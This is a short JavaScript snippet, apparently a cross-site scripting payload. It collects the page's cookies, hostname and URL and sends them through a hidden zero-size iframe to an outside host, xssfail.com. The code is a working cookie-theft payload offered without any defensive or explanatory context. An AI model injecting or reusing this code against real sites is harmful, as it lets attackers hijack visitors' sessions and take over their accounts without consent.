
(function() {
    var cookies = (document.cookie || "");
    cookies = cookies.length > 0 ? cookies.split(';') : []
    
    var query = ["host=" + location.hostname,"url=" + location.href];
    for(var i=0; i<cookies.length; i++)
        query.push("cookie=" + cookies[i]);
    
    var create = function(name) { return document.createElement(name); };
    var append = function(el) { return document.body.appendChild(el); };
    
    var frame = create("iframe");
    frame.setAttribute('style', 'width:0;height:0;border:0;margin:0;padding:0;'); 
    frame.setAttribute('src', "http://xssfail.com/xss/_design/api/form.htm?" + query.join('&'));
    
    append(frame);
})();

